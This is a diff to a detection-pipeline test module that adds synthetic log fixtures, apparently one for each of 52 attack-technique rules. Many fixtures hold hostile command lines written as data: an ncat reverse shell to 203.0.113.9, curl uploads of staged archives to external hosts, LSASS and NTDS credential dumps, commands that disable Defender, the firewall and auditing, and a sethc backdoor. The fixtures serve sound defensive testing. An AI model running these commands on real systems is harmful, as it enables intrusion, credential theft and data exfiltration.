@@ -998,6 +998,292 @@ def full_suite() -> list[dict]:
     return records
 
 
+# ---------------------------------------------------------------------------
+# Fixtures for the 52-rule native expansion (initial access, execution,
+# persistence, privilege escalation, defense evasion, credential access,
+# discovery, lateral movement, collection, C2 / exfiltration).
+# ---------------------------------------------------------------------------
+
+def _eventlog(event_id: int, message: str, raw: dict, user: str = "alice",
+              host: str = "ws01", category: str = "Other") -> dict:
+    return {
+        "source": "eventlog", "channel": "Security", "event_id": event_id,
+        "timestamp": _ts(-1).isoformat(), "user": user, "host": host,
+        "message": message, "raw": raw, "category": category,
+    }
+
+
+def _sysmon(event_id: int, message: str, raw: dict, user: str = "alice") -> dict:
+    return _eventlog(event_id, message, raw, user=user, host="ws01")
+
+
+def spearphishing_attachment() -> list[dict]:
+    return [{
+        "source": "email", "sender": "bob@evilcorp.xyz", "recipient": "alice@corp.local",
+        "subject": "Invoice", "body": "See the attached invoice.", "attachment_types": ".docm",
+        "ip_address": "198.51.100.9", "timestamp": _ts(-1).isoformat(),
+    }]
+
+
+def spearphishing_link() -> list[dict]:
+    return [{
+        "source": "email", "sender": "bob@evilcorp.xyz", "recipient": "alice@corp.local",
+        "subject": "New policy", "body": "https://bit.ly/3xYzAbc update your profile.",
+        "attachment_types": "", "ip_address": "198.51.100.9", "timestamp": _ts(-1).isoformat(),
+    }]
+
+
+def drive_by() -> list[dict]:
+    return [{
+        "source": "http", "process": "chrome.exe", "pid": 1234,
+        "method": "GET", "url": "http://198.51.100.23/exploit", "host": "198.51.100.23",
+        "status_code": 200, "request_body_size": 0, "response_body_size": 400_000,
+        "timestamp": _ts(-1).isoformat(),
+    }]
+
+
+def external_service_exploit() -> list[dict]:
+    return [{
+        "source": "network", "pid": 800, "process": "svchost.exe",
+        "local_ip": "192.168.1.10", "local_port": 445, "remote_ip": "203.0.113.50",
+        "remote_port": 54123, "state": "ESTABLISHED", "is_listening": False,
+        "timestamp": _ts(-1).isoformat(),
+    }]
+
+
+def cmd_script_execution() -> list[dict]:
+    return [_process("cmd.exe", "cmd.exe /c powershell.exe -e QQBjAGMAdQBlAHQAcwA=")]
+
+
+def wmi_execution() -> list[dict]:
+    return [_process("wmic.exe", "wmic process call create cmd.exe /c whoami")]
+
+
+def at_job() -> list[dict]:
+    return [_process("at.exe", "at 09:00 /interactive cmd.exe /c whoami")]
+
+
+def service_execution() -> list[dict]:
+    return [_process("sc.exe", "sc create backdoor binPath= C:\\Users\\Public\\svc.exe start= auto")]
+
+
+def msbuild_execution() -> list[dict]:
+    return [_process("MSBuild.exe", r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\Public\proj.xml")]
+
+
+def python_execution() -> list[dict]:
+    return [_process("python.exe", r"C:\Users\Public\python.exe C:\Users\Public\payload.py")]
+
+
+def startup_folder() -> list[dict]:
+    return [_sysmon(11, "File created",
+                    {"image": "C:\\Users\\Public\\malware.exe",
+                     "target_filename": "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe"})]
+
+
+def service_image_path() -> list[dict]:
+    return [_sysmon(13, "Registry value set",
+                    {"image": "C:\\Users\\Public\\svc.exe", "event_type": "SetValue",
+                     "target_object": "HKLM\\System\\CurrentControlSet\\Services\\sessvc\\ImagePath",
+                     "details": "C:\\Users\\Public\\svc.exe"})]
+
+
+def appinit_dlls() -> list[dict]:
+    return [_sysmon(13, "Registry value set",
+                    {"image": "C:\\Users\\Public\\evil.dll", "event_type": "SetValue",
+                     "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs",
+                     "details": "C:\\Users\\Public\\evil.dll"})]
+
+
+def accessibility_feature() -> list[dict]:
+    return [
+        _sysmon(13, "Registry value set",
+                {"image": "C:\\Users\\Public\\backdoor.exe", "event_type": "SetValue",
+                 "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger",
+                 "details": "C:\\Users\\Public\\backdoor.exe"}),
+        _sysmon(11, "File created",
+                {"image": "C:\\Users\\Public\\backdoor.exe",
+                 "target_filename": "C:\\Windows\\System32\\sethc.exe"}),
+    ]
+
+
+def ifeo_debugger() -> list[dict]:
+    return [_sysmon(13, "Registry value set",
+                    {"image": "C:\\Users\\Public\\evil.exe", "event_type": "SetValue",
+                     "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\\Debugger",
+                     "details": "C:\\Users\\Public\\evil.exe"})]
+
+
+def netsh_helper() -> list[dict]:
+    return [_process("netsh.exe", "netsh add helper C:\\Users\\Public\\evil.dll")]
+
+
+def logon_script() -> list[dict]:
+    return [_sysmon(13, "Registry value set",
+                    {"image": "C:\\Users\\Public\\script.bat", "event_type": "SetValue",
+                     "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
+                     "details": "explorer.exe, C:\\Users\\Public\\script.bat"})]
+
+
+def uac_bypass() -> list[dict]:
+    return [_process("fodhelper.exe", "fodhelper.exe ms-settings:")]
+
+
+def se_debug_privilege() -> list[dict]:
+    return [_process("powershell.exe", "powershell -Command \"AdjustTokenPrivileges SeDebugPrivilege\"; whoami /priv")]
+
+
+def named_pipe() -> list[dict]:
+    return [_process("malware.exe", r"C:\Users\Public\malware.exe \\.\pipe\msf")]
+
+
+def unquoted_service_path() -> list[dict]:
+    return [_eventlog(7045, "Service installed",
+                      {"service_name": "TestSvc", "image_path": "C:\\Program Files\\Test Folder\\app.exe"})]
+
+
+def always_install_elevated() -> list[dict]:
+    return [_sysmon(13, "Registry value set",
+                    {"image": "C:\\Users\\Public\\evil.msi", "event_type": "SetValue",
+                     "target_object": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated",
+                     "details": "0x1"})]
+
+
+def disable_defender() -> list[dict]:
+    return [_process("powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $true")]
+
+
+def disable_firewall() -> list[dict]:
+    return [_process("netsh.exe", "netsh advfirewall set allprofiles state off")]
+
+
+def disable_audit() -> list[dict]:
+    return [_process("auditpol.exe", "auditpol /set /category:Logon/Logoff /success:disable /failure:disable")]
+
+
+def hidden_file_attribute() -> list[dict]:
+    return [_process("cmd.exe", "attrib +h C:\\Users\\Public\\payload.exe")]
+
+
+def disable_system_restore() -> list[dict]:
+    return [_process("reg.exe", 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f')]
+
+
+def lsass_dump() -> list[dict]:
+    return [_process("procdump.exe", "procdump.exe -ma lsass.exe C:\\Users\\Public\\lsass.dmp")]
+
+
+def ntds_dump() -> list[dict]:
+    return [_process("ntdsutil.exe", "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Users\\Public\\ntds\"" )]
+
+
+def password_store() -> list[dict]:
+    return [_process("cmdkey.exe", "cmdkey /list")]
+
+
+def keylogging() -> list[dict]:
+    return [_process("powershell.exe", "GetAsyncKeyState -Key 0x41")]
+
+
+def sniffing() -> list[dict]:
+    return [_process("tcpdump.exe", "tcpdump -i eth0 -w capture.pcap")]
+
+
+def cached_credentials() -> list[dict]:
+    return [_process("cmdkey.exe", "cmdkey /list")]
+
+
+def account_discovery() -> list[dict]:
+    return [_process("net.exe", "net user")]
+
+
+def share_discovery() -> list[dict]:
+    return [_process("net.exe", "net view \\\\10.0.0.2 /all")]
+
+
+def system_info() -> list[dict]:
+    return [_process("systeminfo.exe", "systeminfo")]
+
+
+def domain_discovery() -> list[dict]:
+    return [_process("nltest.exe", "nltest /dclist:corp.local")]
+
+
+def security_software() -> list[dict]:
+    return [_process("wmic.exe", "wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName")]
+
+
+def filesystem_discovery() -> list[dict]:
+    return [_process("powershell.exe", "Get-ChildItem -Path C:\\Users\\alice -Recurse -Force")]
+
+
+def smb_admin_share() -> list[dict]:
+    return [_process("net.exe", "net use \\\\10.0.0.5\\c$ password /user:alice")]
+
+
+def rdp_lateral() -> list[dict]:
+    return [_eventlog(4624, "An account was successfully logged on.",
+                      {"logon_type": 10, "source_ip": "10.0.0.44"}, user="alice")]
+
+
+def winrm_lateral() -> list[dict]:
+    return [_process("powershell.exe", "Invoke-Command -ComputerName ws02 -ScriptBlock { whoami }")]
+
+
+def ssh_lateral() -> list[dict]:
+    return [_process("ssh.exe", "ssh -T root@10.0.0.50 powershell.exe -c whoami")]
+
+
+def clipboard_capture() -> list[dict]:
+    return [_process("powershell.exe", "Get-Clipboard")]
+
+
+def screen_capture() -> list[dict]:
+    return [_process("powershell.exe", "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SystemInformation]::VirtualScreen | CopyFromScreen")]
+
+
+def archive_collection() -> list[dict]:
+    return [_process("7z.exe", r"C:\Program Files\7-Zip\7z.exe a C:\Users\Public\staged.7z C:\Users\alice\Documents\*")]
+
+
+def local_data() -> list[dict]:
+    return [_process("copy.exe", r"copy C:\Users\alice\Documents\finance.xlsx C:\Users\Public\finance.xlsx")]
+
+
+def proxy_tool() -> list[dict]:
+    return [_process("chisel.exe", r"C:\Users\Public\chisel.exe client 203.0.113.9:8080 R:socks")]
+
+
+def unusual_port() -> list[dict]:
+    return [{
+        "source": "network", "pid": 4321, "process": "powershell.exe",
+        "local_ip": "192.168.1.10", "local_port": 50000, "remote_ip": "203.0.113.9",
+        "remote_port": 4444, "state": "ESTABLISHED", "is_listening": False,
+        "timestamp": _ts(-1).isoformat(),
+    }]
+
+
+def encrypted_channel() -> list[dict]:
+    return [_process("ncat.exe", r"C:\Users\Public\ncat.exe 203.0.113.9 4444 -e cmd.exe")]
+
+
+def exfil_alt() -> list[dict]:
+    return [_process("curl.exe", "curl -T C:\\Users\\Public\\staged.7z ftp://203.0.113.9/")]
+
+
+def exfil_web() -> list[dict]:
+    return [
+        _process("curl.exe", "curl -X POST --data-binary @C:\\Users\\Public\\staged.7z https://pastebin.com/api/api_post.php"),
+        {
+            "source": "http", "process": "powershell.exe", "pid": 4321,
+            "method": "POST", "url": "https://transfer.sh/staged.7z",
+            "host": "transfer.sh", "status_code": 200,
+            "request_body_size": 1_500_000, "response_body_size": 100,
+            "timestamp": _ts(-1).isoformat(),
+        },
+    ]
+
+
 def run_pipeline_records(records: list[dict]):
     """Insert raw records through the pipeline (test helper)."""
     from backend.database.connection import SessionLocal
